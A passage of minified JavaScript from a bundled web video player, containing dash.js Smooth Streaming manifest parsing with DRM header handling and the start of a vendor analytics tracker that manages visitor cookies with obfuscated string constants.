0;Q.protocol="MSS",Q.profiles="urn:mpeg:dash:profile:isoff-live:2011",Q.type="TRUE"===ma.getAttribute("IsLive")?"dynamic":"static";var V,oa,ba,ha,S=ma.getAttribute("TimeScale");if(Q.timescale=S?parseFloat(S):1e7,S=parseFloat(ma.getAttribute("DVRWindowLength")),"dynamic"!==Q.type||0!==S&&!isNaN(S)||(S=1/0),0===S&&"TRUE"===ma.getAttribute("CanSeek")&&(S=1/0),0<S&&(Q.timeShiftBufferDepth=S/Q.timescale),S=parseFloat(ma.getAttribute("Duration")),Q.mediaPresentationDuration=0===S?1/0:S/Q.timescale,Q.minBufferTime=2,Q.ttmlTimeIsRelative=!0,"dynamic"===Q.type&&0<S&&(Q.type="static",Q.timeShiftBufferDepth=S/Q.timescale),"dynamic"===Q.type&&Q.timeShiftBufferDepth<1/0&&(Q.refreshManifestOnSwitchTrack=!0,Q.doNotUpdateDVRWindowOnBufferUpdated=!0,Q.ignorePostponeTimePeriod=!0),Q.Period=function g(O,R){var Q={},ja=void 0;Q.AdaptationSet_asArray=[],O=O.getElementsByTagName("StreamIndex");for(var W=0;W<O.length;W++)null!==(ja=function(aa,ma){var H={},B=[],A=void 0,Y=void 0,Z=void 0;A=aa.getAttribute("Name"),Z=aa.getAttribute("Type");var T,pa,na=aa.getAttribute("Language");for(H.id=A||(na?Z+"_"+na:Z),H.contentType=Z,H.lang=na||"und",H.mimeType=h[Z],H.subType=aa.getAttribute("Subtype"),H.maxWidth=aa.getAttribute("MaxWidth"),H.maxHeight=aa.getAttribute("MaxHeight"),H.subType&&(G[H.subType]&&(T={schemeIdUri:"urn:mpeg:dash:role:2011",value:G[H.subType]},H.Role=T,H.Role_asArray=[T]),N[H.subType]&&(pa={schemeIdUri:"urn:tva:metadata:cs:AudioPurposeCS:2007",value:N[H.subType]},H.Accessibility=pa,H.Accessibility_asArray=[pa])),ma=function(ia,S){var ha,V={},oa=void 0,ba=void 0;oa=(oa=(ha=ia.getAttribute("Url"))?ha.replace("{bitrate}","$Bandwidth$"):null)?oa.replace("{start time}","$Time$"):null,ba=(ba=ia.getAttribute("TimeScale"))?parseFloat(ba):S,V.media=oa,V.timescale=ba,S=V.timescale,oa={},ia=ia.getElementsByTagName("c"),ba=[];var C,fa,qa,ka=ha=void 0,la=void 0,va=0;for(C=0;C<ia.length;C++)if(ha={},(la=ia[C].getAttribute("t"))&&(0,l.default)(la).greater((0,l.default)(Number.MAX_SAFE_INTEGER))&&(ha.tManifest=la),ha.t=parseFloat(la),ha.d=parseFloat(ia[C].getAttribute("d")),0!==C||ha.t||(ha.t=0),0<C&&((ka=ba[ba.length-1]).d||(ka.tManifest?ka.d=(0,l.default)(la).subtract((0,l.default)(ka.tManifest)).toJSNumber():ka.d=ha.t-ka.t,va+=ka.d),ha.t||(ka.tManifest?(ha.tManifest=(0,l.default)(ka.tManifest).add((0,l.default)(ka.d)).toString(),ha.t=parseFloat(ha.tManifest)):ha.t=ka.t+ka.d)),ha.d&&(va+=ha.d),ba.push(ha),qa=parseFloat(ia[C].getAttribute("r")))for(fa=0;fa<qa-1;fa++)ka=ba[ba.length-1],(ha={}).t=ka.t+ka.d,ha.d=ka.d,ka.tManifest&&(ha.tManifest=(0,l.default)(ka.tManifest).add((0,l.default)(ka.d)).toString()),va+=ha.d,ba.push(ha);return oa.S=ba,oa.S_asArray=ba,oa.duration=va/S,S=oa,V.SegmentTimeline=S,V}(aa,ma),A=aa.getElementsByTagName("QualityLevel"),Z=0;Z<A.length;Z++)A[Z].BaseURL=H.BaseURL,A[Z].mimeType=H.mimeType,A[Z].Id=H.id+"_"+A[Z].getAttribute("Index"),null!==(Y=function(ia,S){var ha,ka,V={},oa=S.getAttribute("Type"),ba=null;if(V.id=ia.Id,V.bandwidth=parseInt(ia.getAttribute("Bitrate"),10),V.mimeType=ia.mimeType,V.width=parseInt(ia.getAttribute("MaxWidth"),10),V.height=parseInt(ia.getAttribute("MaxHeight"),10),null!==(ba=ia.getAttribute("FourCC"))&&""!==ba||(ba=S.getAttribute("FourCC")),null===ba||""===ba)if(oa===J.AUDIO)ba="AAC";else if(oa===J.VIDEO)return F.debug('FourCC is not defined whereas it is required for a QualityLevel element for a StreamIndex of type "video"'),null;return-1===L.indexOf(ba.toUpperCase())?(F.warn("Codec not supported: "+ba),null):("H264"===ba||"AVC1"===ba?V.codecs=(ha=(ha=ia).getAttribute("CodecPrivateData").toString(),"avc1."+((ka=/00000001[0-9]7/.exec(ha))&&ka[0]?ha.substr(ha.indexOf(ka[0])+10,6):void 0)):0<=ba.indexOf("AAC")?(V.codecs=function(ha,ka){var la=parseInt(ha.getAttribute("SamplingRate"),10),C=ha.getAttribute("CodecPrivateData").toString(),fa=0,qa=void 0,va=void 0,xa=void 0;return"AACH"===ka&&(fa=5),void 0===C||""===C?(fa=2,va=w[la],C=(C=""+("AACH"===ka?(fa=5,C=new Uint8Array(4),xa=w[2*la],C[0]=fa<<3|va>>1,C[1]=va<<7|ha.Channels<<3|xa>>1,C[2]=xa<<7|8,C[3]=0,(qa=new Uint16Array(2))[0]=(C[0]<<8)+C[1],qa[1]=(C[2]<<8)+C[3],qa[0].toString(16),qa[0].toString(16)+qa[1].toString(16)):((C=new Uint8Array(2))[0]=fa<<3|va>>1,C[1]=va<<7|parseInt(ha.getAttribute("Channels"),10)<<3,(qa=new Uint16Array(1))[0]=(C[0]<<8)+C[1],qa[0].toString(16)))).toUpperCase(),ha.setAttribute("CodecPrivateData",C)):0===fa&&(fa=(248&parseInt(C.substr(0,2),16))>>3),"mp4a.40."+fa}(ia,ba),V.audioSamplingRate=parseInt(ia.getAttribute("SamplingRate"),10),V.audioChannels=parseInt(ia.getAttribute("Channels"),10)):(ba.indexOf("TTML")||ba.indexOf("DFXP"))&&(V.codecs=J.STPP),V.codecPrivateData=""+ia.getAttribute("CodecPrivateData"),V.BaseURL=ia.BaseURL,V)}(A[Z],aa))&&(Y.SegmentTemplate=ma,B.push(Y));return 0!==B.length?(H.Representation=1<B.length?B:B[0],H.Representation_asArray=B,H.SegmentTemplate=ma,ma.SegmentTimeline.S_asArray,H):null}(O[W],R))&&Q.AdaptationSet_asArray.push(ja);return 0<Q.AdaptationSet_asArray.length&&(Q.AdaptationSet=1<Q.AdaptationSet_asArray.length?Q.AdaptationSet_asArray:Q.AdaptationSet_asArray[0]),Q}(ma,Q.timescale),Q.Period_asArray=[Q.Period],void((ma=Q.Period).start=0)!==H){(B=ja.getElementsByTagName("ProtectionHeader")[0]).firstChild.data=B.firstChild.data.replace(/\n|\r/g,""),S=H=void 0;a:{var ka=x.decodeArray(B.firstChild.data),la=void 0,C=ja=void 0,fa=0;for(ka[fa+3],ka[fa+2],ka[fa+1],ka[fa],ka[(fa+=4)+1],ka[fa],fa+=2;fa<ka.length;)if(la=(ka[fa+1]<<8)+ka[fa],fa+=2,1===la){ja=(ka[fa+1]<<8)+ka[fa],fa+=2,(C=new Uint8Array(ja)).set(ka.subarray(fa,fa+ja)),ka=C;break a}ka=null}(H=ka)&&(H=new Uint16Array(H.buffer),H=String.fromCharCode.apply(null,H),S=(new DOMParser).parseFromString(H,"application/xml").querySelector("KID").textContent,t(A=S=x.decodeArray(S),0,3),t(A,1,2),t(A,4,5),t(A,6,7)),ja=S,(A={schemeIdUri:"urn:uuid:9a04f079-9840-4286-ab92-e65be0885f95",value:"com.microsoft.playready",pro:pa={__text:B.firstChild.data,__prefix:"mspr"},pro_asArray:pa})["cenc:default_KID"]=ja,aa.push(A),B={schemeIdUri:"urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed",value:"com.widevine.alpha"},ja&&((H=new Uint8Array(2+ja.length))[0]=18,H[1]=16,H.set(ja,2),S=32+H.length,A=0,(pa=new Uint8Array(S))[A++]=(4278190080&S)>>24,pa[A++]=(16711680&S)>>16,pa[A++]=(65280&S)>>8,pa[A++]=255&S,pa.set([112,115,115,104,0,0,0,0],A),A+=8,pa.set([237,239,139,169,121,214,74,206,163,200,39,220,213,29,33,237],A),A+=16,pa[A++]=(4278190080&H.length)>>24,pa[A++]=(16711680&H.length)>>16,pa[A++]=(65280&H.length)>>8,pa[A++]=255&H.length,pa.set(H,A),pa=String.fromCharCode.apply(null,pa),pa=x.encodeASCII(pa),B.pssh={__text:pa}),(A=B)["cenc:default_KID"]=ja,aa.push(A),Q.ContentProtection=aa,Q.ContentProtection_asArray=aa}for(aa=ma.AdaptationSet_asArray,pa=0;pa<aa.length;pa+=1)aa[pa].SegmentTemplate.initialization="$Bandwidth$",void 0!==Q.ContentProtection&&(aa[pa].ContentProtection=Q.ContentProtection,aa[pa].ContentProtection_asArray=Q.ContentProtection_asArray),"video"===aa[pa].contentType&&(T=aa[pa].SegmentTemplate.SegmentTimeline.S_asArray[0].d/aa[pa].SegmentTemplate.timescale,Q.minBufferTime=T,"dynamic"===Q.type&&(ia=((na=aa[pa].SegmentTemplate.SegmentTimeline.S_asArray)[na.length-1].t+na[na.length-1].d)/aa[pa].SegmentTemplate.timescale*1e3,Q.availabilityStartTime=new Date(W.getTime()-ia),0<Q.timeShiftBufferDepth&&Q.timeShiftBufferDepth!==1/0&&Q.timeShiftBufferDepth>aa[pa].SegmentTemplate.SegmentTimeline.duration&&(Q.timeShiftBufferDepth=aa[pa].SegmentTemplate.SegmentTimeline.duration)));if(Q.minBufferTime=Math.min(Q.minBufferTime,Q.timeShiftBufferDepth?Q.timeShiftBufferDepth:1/0),"dynamic"===Q.type&&(V=(V=D.getLiveDelay())||T*(null===I.get().streaming.liveDelayFragmentCount||isNaN(I.get().streaming.liveDelayFragmentCount)?4:I.get().streaming.liveDelayFragmentCount),oa=Math.max(Q.timeShiftBufferDepth-10,Q.timeShiftBufferDepth/2),ha=(ba=Math.min(oa,V))-T,P={streaming:{liveDelay:I.get().streaming.liveDelay,stableBufferTime:I.get().streaming.stableBufferTime,bufferTimeAtTopQuality:I.get().streaming.bufferTimeAtTopQuality,bufferTimeAtTopQualityLongForm:I.get().streaming.bufferTimeAtTopQualityLongForm}},I.update({streaming:{liveDelay:ba,stableBufferTime:ha,bufferTimeAtTopQuality:ha,bufferTimeAtTopQualityLongForm:ha}})),delete Q.ContentProtection,delete Q.ContentProtection_asArray,"static"===Q.type){if((ia=E.getValue())&&ia.timestampOffset)Y=ia.timestampOffset;else for(pa=0;pa<aa.length;pa++)aa[pa].contentType!==J.AUDIO&&aa[pa].contentType!==J.VIDEO||(Z=aa[pa].SegmentTemplate.SegmentTimeline.S_asArray[0].t/aa[pa].SegmentTemplate.timescale,void 0===Y&&(Y=Z),Y=Math.min(Y,Z),Q.mediaPresentationDuration=Math.min(Q.mediaPresentationDuration,aa[pa].SegmentTemplate.SegmentTimeline.duration));if(0<Y){for(Q.timestampOffset=Y,pa=0;pa<aa.length;pa++){for(na=aa[pa].SegmentTemplate.SegmentTimeline.S_asArray,ia=0;ia<na.length;ia++)na[ia].tManifest||(na[ia].tManifest=na[ia].t),na[ia].t-=Y*aa[pa].SegmentTemplate.timescale;aa[pa].contentType!==J.AUDIO&&aa[pa].contentType!==J.VIDEO||(ma.start=Math.max(na[0].t,ma.start),aa[pa].SegmentTemplate.presentationTimeOffset=ma.start)}ma.start/=Q.timescale}}return Q.mediaPresentationDuration=Math.floor(1e3*Q.mediaPresentationDuration)/1e3,ma.duration=Q.mediaPresentationDuration,Y=wa.performance.now(),F.info("Parsing complete: (xmlParsing: "+(O-R).toPrecision(3)+"ms, mss2dash: "+(Y-O).toPrecision(3)+"ms, total: "+((Y-R)/1e3).toPrecision(3)+"s)"),Q},getMatchers:function(){return null},getIron:function(){return null},reset:function(){P&&I.update(P)}},F=z.getLogger(r),r}Object.defineProperty(v,"__esModule",{value:!0});var p,l=(p=da(1))&&p.__esModule?p:{default:p};m.__dashjs_factory_name="MssParser",v.default=Na.FactoryMaker.getClassFactory(m),M.exports=v.default},{1:1}],13:[function(da,M,v){function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");a:{for(var p=Object.getPrototypeOf(m.prototype),l="constructor",f=this,g=!0;g;){if(null===p&&(p=Function.prototype),void 0!==(g=Object.getOwnPropertyDescriptor(p,l))){if("value"in g){f=g.value;break a}if(void 0===(l=g.get))break;f=l.call(f);break a}if(null===(p=Object.getPrototypeOf(p)))break;g=!0}f=void 0}f.call(this),this.AST_IN_FUTURE="astInFuture",this.BUFFER_EMPTY="bufferStalled",this.BUFFER_LOADED="bufferLoaded",this.BUFFER_LEVEL_STATE_CHANGED="bufferStateChanged",this.ERROR="error",this.FRAGMENT_LOADING_COMPLETED="fragmentLoadingCompleted",this.FRAGMENT_LOADING_PROGRESS="fragmentLoadingProgress",this.FRAGMENT_LOADING_STARTED="fragmentLoadingStarted",this.FRAGMENT_LOADING_ABANDONED="fragmentLoadingAbandoned",this.LOG="log",this.MANIFEST_LOADED="manifestLoaded",this.METRICS_CHANGED="metricsChanged",this.METRIC_CHANGED="metricChanged",this.METRIC_ADDED="metricAdded",this.METRIC_UPDATED="metricUpdated",this.PERIOD_SWITCH_COMPLETED="periodSwitchCompleted",this.PERIOD_SWITCH_STARTED="periodSwitchStarted",this.QUALITY_CHANGE_REQUESTED="qualityChangeRequested",this.QUALITY_CHANGE_RENDERED="qualityChangeRendered",this.TRACK_CHANGE_RENDERED="trackChangeRendered",this.SOURCE_INITIALIZED="sourceInitialized",this.STREAM_INITIALIZING="streamInitializing",this.STREAM_INITIALIZED="streamInitialized",this.STREAM_TEARDOWN_COMPLETE="streamTeardownComplete",this.TEXT_TRACKS_ADDED="allTextTracksAdded",this.TEXT_TRACK_ADDED="textTrackAdded",this.TTML_PARSED="ttmlParsed",this.TTML_TO_PARSE="ttmlToParse",this.CAPTION_RENDERED="captionRendered",this.CAPTION_CONTAINER_RESIZE="captionContainerResize",this.CAN_PLAY="canPlay",this.PLAYBACK_ENDED="playbackEnded",this.PLAYBACK_ERROR="playbackError",this.PLAYBACK_NOT_ALLOWED="playbackNotAllowed",this.PLAYBACK_METADATA_LOADED="playbackMetaDataLoaded",this.PLAYBACK_PAUSED="playbackPaused",this.PLAYBACK_PLAYING="playbackPlaying",this.PLAYBACK_PROGRESS="playbackProgress",this.PLAYBACK_RATE_CHANGED="playbackRateChanged",this.PLAYBACK_SEEKED="playbackSeeked",this.PLAYBACK_SEEKING="playbackSeeking",this.PLAYBACK_SEEK_ASKED="playbackSeekAsked",this.PLAYBACK_STALLED="playbackStalled",this.PLAYBACK_STARTED="playbackStarted",this.PLAYBACK_TIME_UPDATED="playbackTimeUpdated",this.PLAYBACK_WAITING="playbackWaiting",this.MANIFEST_VALIDITY_CHANGED="manifestValidityChanged"}Object.defineProperty(v,"__esModule",{value:!0}),da=new(function(p,l){if("function"!=typeof l&&null!==l)throw new TypeError("Super expression must either be null or a function, not "+typeof l);p.prototype=Object.create(l&&l.prototype,{constructor:{value:p,enumerable:!1,writable:!0,configurable:!0}}),l&&(Object.setPrototypeOf?Object.setPrototypeOf(p,l):p.__proto__=l)}(m,((da=da(4))&&da.__esModule?da:{default:da}).default),m),v.default=da,M.exports=v.default},{4:4}],14:[function(da,M,v){function m(){var l={};return{save:function(f){var g=f.streamId,t=f.representationId;l[g]=l[g]||{},l[g][t]=f},extract:function(f,g){return l&&l[f]&&l[f][g]?l[f][g]:null},reset:function(){l={}}}}var p;Object.defineProperty(v,"__esModule",{value:!0}),da=(p=da(2))&&p.__esModule?p:{default:p},m.__dashjs_factory_name="InitCache",v.default=da.default.getSingletonFactory(m),M.exports=v.default},{2:2}],15:[function(da,M,v){Object.defineProperty(v,"__esModule",{value:!0}),v.default=function g(p,l,f){if(!(this instanceof g))throw new TypeError("Cannot call a class as a function");this.code=p||null,this.message=l||null,this.data=f||null},M.exports=v.default},{}],16:[function(da,M,v){Object.defineProperty(v,"__esModule",{value:!0}),v.default=function p(){if(!(this instanceof p))throw new TypeError("Cannot call a class as a function");this.segmentType=this.mediaInfo=this.streamId=null,this.index=this.quality=NaN,this.bytes=null,this.duration=this.end=this.start=NaN,this.endFragment=this.representationId=null},M.exports=v.default},{}],17:[function(da,M,v){function m(f,g){for(var t=0;t<g.length;t++){var r=g[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(f,r.key,r)}}function p(f){if(!(this instanceof p))throw new TypeError("Cannot call a class as a function");this.action=p.ACTION_DOWNLOAD,this.startTime=NaN,this.type=this.mediaInfo=this.mediaType=null,this.timescale=this.duration=NaN,this.range=null,this.url=f||null,this.requestEndDate=this.firstByteDate=this.requestStartDate=this.serviceLocation=null,this.index=this.quality=NaN,this.wallStartTime=this.availabilityEndTime=this.availabilityStartTime=null,this.delayLoadingTime=this.bytesTotal=this.bytesLoaded=NaN,this.responseType="arraybuffer",this.representationId=null}Object.defineProperty(v,"__esModule",{value:!0});var f,g,l=da(18);f=p,g=[{key:"isInitializationRequest",value:function(){return this.type&&this.type===l.HTTPRequest.INIT_SEGMENT_TYPE}},{key:"setInfo",value:function(f){this.type=f&&f.init?l.HTTPRequest.INIT_SEGMENT_TYPE:l.HTTPRequest.MEDIA_SEGMENT_TYPE,this.url=f&&f.url?f.url:null,this.range=f&&f.range?f.range.start+"-"+f.range.end:null,this.mediaType=f&&f.mediaType?f.mediaType:null}}],g&&m(f.prototype,g),(da=p).ACTION_DOWNLOAD="download",da.ACTION_COMPLETE="complete",v.default=da,M.exports=v.default},{18:18}],18:[function(da,M,v){function m(l,f){if(!(l instanceof f))throw new TypeError("Cannot call a class as a function")}function p(){m(this,p),this.interval=this.responsecode=this.tresponse=this.trequest=this.range=this.actualurl=this.url=this.type=this.tcpid=null,this.trace=[],this._serviceLocation=this._responseHeaders=this._quality=this._mediaduration=this._tfinish=this._stream=null}Object.defineProperty(v,"__esModule",{value:!0}),p.GET="GET",p.HEAD="HEAD",p.MPD_TYPE="MPD",p.XLINK_EXPANSION_TYPE="XLinkExpansion",p.INIT_SEGMENT_TYPE="InitializationSegment",p.INDEX_SEGMENT_TYPE="IndexSegment",p.MEDIA_SEGMENT_TYPE="MediaSegment",p.BITSTREAM_SWITCHING_SEGMENT_TYPE="BitstreamSwitchingSegment",p.OTHER_TYPE="other",v.HTTPRequest=p,v.HTTPRequestTrace=function f(){m(this,f),this.d=this.s=null,this.b=[]}},{}]},{},[11]),wa.bradmax.dashjs=Na,Va?wa.dashjs=Va:delete wa.dashjs,xb.exports&&(pb.dash=xb.exports)}catch(sb){console.error(sb)}}if(window.bradmax||(window.bradmax={}),window.bradmax.jsdependency||(window.bradmax.jsdependency={}),!window.bradmax.jsdependency.js_bd828cd9588d25a037e40a5ac023aa7d){window.bradmax.jsdependency.js_bd828cd9588d25a037e40a5ac023aa7d=!0;try{xb={},function(sb,Ja,U){!function(wa){function Va(){}function Na(){this.j=Object.create(null)}function Oa(w,h){this.item=w,this.next=h}function u(){this.length=0}function da(w,h,F){v.call(this,String(w),h,F),this.value=w}function M(w){var h=this;this.id=setInterval((function(){h.Sa()}),w)}function v(w,h,F){this.message=w,this.Ca=null!=F?F:this}function m(){}function p(){}function l(){}function f(){this.ha=new Na,this.Pa=this.Qa=this.Oa=null,this.ca=new Na,this.ma=new Na,this.Na=null,this.Ka=new u,this.ja=[],this.T=new Na,this.N=new Na,this.na=sb.screen,this.w=sb,this.d=document,this.buffer=[];var w=this;this.g=new g(this),sb.bams=x(this,this.action),sb.bams(),sb._ba_action=x(this,this.action),sb._ba_action(),sb._ba_video_event=x(this,this.Vb),sb._ba_video_event(),sb._ba_track=x(this,this.Lb),sb._ba_track(),sb._ba_untrack=x(this,this.Ob),sb._ba_untrack(),sb._ba_enable_cookies=x(J=this.g,J.Ja),sb._ba_disable_cookies=x(J=this.g,J.mb),sb._ba_use_cookies=x(J=this.g,J.F),this.g.$(this.w,"unload",(function(){w.qa(!0)})),this.g.$(this.w,"beforeunload",(function(){w.qa(!0)})),this.g.$(this.d,"mousedown",(function(){w.qa(!1)})),setInterval(x(this,this.ub),6e5),this.vb()}function g(w){this.W=new Na,this.na=sb.screen,this.w=sb,this.d=document,this.Ia=!1,this.U="",this.I=!1,this.Aa="",this.O="Um9sYGg=",this.P="Um9sYGE=",this.Z="Um9sYG5pbg==",this.ta="Um9saWx5bFJ+aHU=",this.sa="Um9saWx5bFJsamg=",this.Ua="fnlseX4jb39saWBsdSNuYmAiezw=",this.wa="b39saWBsdSB+eWx5fiBlbg==",this.Va="ZXl5fX43IiJ+eWx5fiNvf2xpYGx1I25iYCJ7PCJqbiNleWBh",this.ua="T19MSUBMVVJOSU5SX0hbRFtIUg==",this.va="b39saWBsdSB+eWx5fiBuaW4=",this.da="b39saWBsdSB+eWx5fiBuYmJmZGh+IGhjbG9haGk=",this.xa="b39saWBsdSB+eWx5fiB5f2xuZiBlbH5l",this.za="b39saWBsdSB+eWx5fiB5f2xuZiB9bH9sYH4=",this.ya="b39saWBsdSB+eWx5fiB5f2xuZiB9bGpo",this.log=w,this.Ia="file:"==this.d.location.href.substr(0,5),this.Aa=this.Y(),this.I=this.F();a:{w=this.i(this.Z)+"=";for(var h=decodeURIComponent(document.cookie).split(";"),F=0;F<h.length;F++){for(var P=h[F];" "==P.charAt(0);)P=P.substring(1);if(0==P.indexOf(w)){w=P.substring(w.length,P.length);break a}}w=""}this.U=w,""==this.U&&this.I&&this.ia()}function t(){}function r(w,h){for(var F in w=Object.create(w),h)w[F]=h[F];return h.toString!==Object.prototype.toString&&(w.toString=h.toString),w}function x(w,h){return null==h?null:(null==h.ea&&(h.ea=wa.ra++),null==w.ka?w.ka={}:F=w.ka[h.ea],null==F&&(F=h.bind(w),w.ka[h.ea]=F),F);var F}t.l=!0,t.ib=function(w,h){if((w=w.charCodeAt(h))==w)return w},t.now=function(){return Date.now()},g.l=!0,g.prototype={Mb:function(){var w=!1;return null!=l.u(this.w,this.i(this.ya))&&(w=l.u(this.w,this.i(this.ya))),w},Nb:function(){var w=!1;return null!=l.u(this.w,this.i(this.za))&&(w=l.u(this.w,this.i(this.za))),w},Kb:function(){var w=!1;return null!=l.u(this.w,this.i(this.xa))&&(w=l.u(this.w,this.i(this.xa))),w},Ub:function(){function w(P){P+="=";for(var O=decodeURIComponent(document.cookie).split(";"),R=0;R<O.length;R++){for(var Q=O[R];" "==Q.charAt(0);)Q=Q.substring(1);if(0==Q.indexOf(P))return Q.substring(P.length,Q.length)}return""}var h=this.i(this.P),F=w(h);return""==F&&(h=this.i(this.P),Object.prototype.hasOwnProperty.call(this.W.j,h)?F=this.W.j[h]:(F=this.Y(),this.W.j[h]=F)),h=this.i(this.P),0==this.F()&&0==this.I||(w=function(P,O,R){var Q=new Date;Q.setTime(Q.getTime()+864e5*R),document.cookie=P+"="+O+";expires="+Q.toUTCString()+";path=/"})(h,F,730),F},Tb:function(){function w(P){P+="=";for(var O=decodeURIComponent(document.cookie).split(";"),R=0;R<O.length;R++){for(var Q=O[R];" "==Q.charAt(0);)Q=Q.substring(1);if(0==Q.indexOf(P))return Q.substring(P.length,Q.length)}return""}var h=this.i(this.O),F=w(h);return""==F&&(h=this.i(this.O),Object.prototype.hasOwnProperty.call(this.W.j,h)?F=this.W.j[h]:(F=this.Y(),this.W.j[h]=F)),h=this.i(this.O),0==this.F()&&0==this.I||(w=function(P,O,R){var Q=new Date;Q.setTime(Q.getTime()+864e5*R),document.cookie=P+"="+O+";expires="+Q.toUTCString()+";path=/"})(h,F,.020833333333333332),F},rb:function(){return null==l.u(this.w,this.i(this.wa))?this.i(this.Ua):l.u(this.w,this.i(this.wa))},ia:function(w){null==w&&(w=!1);var h=null==l.u(this.w,this.i(this.va))?this.i(this.Va):l.u(this.w,this.i(this.va));if(this.Ia)this.log.request();else{this.$(this.w,"message",x(this,this.tb));var F=document.createElement("iframe");F.setAttribute("src",h+"?parent="+p.o(this.d.location.href)+"&delete="+(null==w?"null":""+w)),F.setAttribute("width",0),F.setAttribute("height",0),F.setAttribute("scrolling","no"),F.style.display="none",F.style.visibility="hidden",document.head.appendChild(F),setTimeout(x(J=this.log,J.request),4e3)}},tb:function(w){if(null!=w&&null!=w.data&&"string"==typeof w.data&&0==w.data.indexOf(this.i(this.ua))){this.U=w.data.split(this.i(this.ua))[1],w=this.i(this.Z);var h=this.U;if(0!=this.F()||0!=this.I){var F=new Date;F.setTime(F.getTime()+63072e6),document.cookie=w+"="+h+";expires="+F.toUTCString()+";path=/"}this.log.request()}},V:function(){return this.F()?this.U:this.Aa},Ga:function(){if(this.F())return!0;var w=1==l.u(this.w,this.i(this.da));return 1!=w||this.F()||this.Ja(),w},F:function(){function w(O){O+="=";for(var R=decodeURIComponent(document.cookie).split(";"),Q=0;Q<R.length;Q++){for(var ja=R[Q];" "==ja.charAt(0);)ja=ja.substring(1);if(0==ja.indexOf(O))return ja.substring(O.length,ja.length)}return""}var h=this.i(this.Z),F=w(h),P=(w=function(O){O+="=";for(var R=decodeURIComponent(document.cookie).split(";"),Q=0;Q<R.length;Q++){for(var ja=R[Q];" "==ja.charAt(0);)ja=ja.substring(1);if(0==ja.indexOf(O))return ja.substring(O.length,ja.length)}return""})(h=this.i(this.O));return h=(w=function(O){O+="=";for(var R=decodeURIComponent(document.cookie).split(";"),Q=0;Q<R.length;Q++){for(var ja=R[Q];" "==ja.charAt(0);)ja=ja.substring(1);if(0==ja.indexOf(O))return ja.substring(O.length,ja.length)}return""})(h=this.i(this.P)),""!=F||""!=P||""!=h},Ja:function(){function w(O){O+="=";for(var R=decodeURIComponent(document.cookie).split(";"),Q=0;Q<R.length;Q++){for(var ja=R[Q];" "==ja.charAt(0);)ja=ja.substring(1);if(0==ja.indexOf(O))return ja.substring(O.length,ja.length)}return""}this.I=!0,this.w[this.i(this.da)]=!0;var h=this.i(this.P),F=w(h);""==F&&(F=this.Y());var P=(w=function(O){O+="=";for(var R=decodeURIComponent(document.cookie).split(";"),Q=0;Q<R.length;Q++){for(var ja=R[Q];" "==ja.charAt(0);)ja=ja.substring(1);if(0==ja.indexOf(O))return ja.substring(O.length,ja.length)}return""})(h=this.i(this.O));""==P&&(P=this.Y()),h=this.i(this.P),0==this.F()&&0==this.I||(w=function(O,R,Q){var ja=new Date;ja.setTime(ja.getTime()+864e5*Q),document.cookie=O+"="+R+";expires="+ja.toUTCString()+";path=/"})(h,F,730),h=this.i(this.O),0==this.F()&&0==this.I||(w=function(O,R,Q){var ja=new Date;ja.setTime(ja.getTime()+864e5*Q),document.cookie=O+"="+R+";expires="+ja.toUTCString()+";path=/"})(h,P,.020833333333333332),this.ia()},mb:function(){function w(F){var P=new Date;P.setTime(P.getTime()+1e3),document.cookie=F+"=;expires="+P.toUTCString()+";path=/"}this.I=!1,l.lb(this.w,this.i(this.da)),this.ia(!0);var h=this.i(this.Z);w(h),(w=function(F){var P=new Date;P.setTime(P.getTime()+1e3),document.cookie=F+"=;expires="+P.toUTCString()+";path=/"})(h=this.i(this.O)),(w=function(F){var P=new Date;P.setTime(P.getTime()+1e3),document.cookie=F+"=;expires="+P.toUTCString()+";path=/"})(h=this.i(this.P))},getTimezoneOffset:function(){return(new Date).getTimezoneOffset()},warn:function(w){console.warn(w)},A:function(w){var h="";try{h=w.join(",")}catch(O){try{var F=""+p.parseInt(""+p.o(w));F==""+p.o(w)&&(h=F);var P=""+parseFloat(""+p.o(w));P==""+p.o(w)&&(h=P)}catch(R){h=""}}return h},Y:function(w){null==w&&(w="xxxxxxxxxx"),w=w.toLowerCase();for(var h="";h.length<w.length;)if("-"===w.charAt(0))h+="-";else h+="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".charAt(p.random(62));return h},now:function(){return(new Date).getTime()},v:function(){return Math.floor(this.now()/1e3)},$:function(w,h,F){w.addEventListener?w.addEventListener(h,F,!1):w.attachEvent&&w.attachEvent("on"+p.o(h),F)},i:function(w,h){null==h&&(h=13);for(var F="",P=0,O=(w=this.hb(w)).length;P<O;){var R=P++;F+=String.fromCodePoint(h^t.ib(w,R))}return F},hb:function(w){var F,O,Q,h={},P=0,R=0,ja="",W=String.fromCharCode,aa=w.length;for(F=0;64>F;F++)h["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(F)]=F;for(O=0;O<aa;O++)for(P=(P<<6)+(F=h[w.charAt(O)]),R+=6;8<=R;)((Q=P>>>(R-=8)&255)||O<aa-2)&&(ja+=W(Q));return ja},Ha:function(w){return JSON.parse(JSON.stringify(w))},H:g},f.l=!0,f.wb=function(){f.sb()},f.sb=function(){null==f.instance&&(f.instance=new f)},f.prototype={Lb:function(w){null!=w&&""!=w&&(this.ha.j[w]=!0,this.action(w,{event:"page.view"}))},Ob:function(w){var h=this.ha;Object.prototype.hasOwnProperty.call(h.j,w)&&delete h.j[w]},vb:function(){var w=this,h=this.g.d.location.href;new M(100).Sa=function(){h!=w.g.d.location.href&&(h=w.g.d.location.href,w.xb(h))}},xb:function(w){var h=this.g.Mb(),F=this.g.Nb(),P=this.g.Kb(),O=w.split("#"),R=O[1];w=(O=O[0].split("?"))[1],O=O[0],(h&&this.Pa!=O||F&&this.Qa!=w||P&&this.Oa!=R)&&this.la(),this.Pa=O,this.Qa=w,this.Oa=R},la:function(){for(var w=Object.keys(this.ha.j),h=w.length,F=0;F<h;){var P=w[F++];null!=P&&""!=P&&this.action(P,{event:"page.view"})}},ub:function(){for(var w=this.T.j,h=Object.keys(w),F=h.length,P=0;P<F;){var O=w[h[P++]],R=new Image,Q="&cc="+this.g.V();R.src=""+O.uri+Q}},qa:function(w){var h="sendBeacon"in 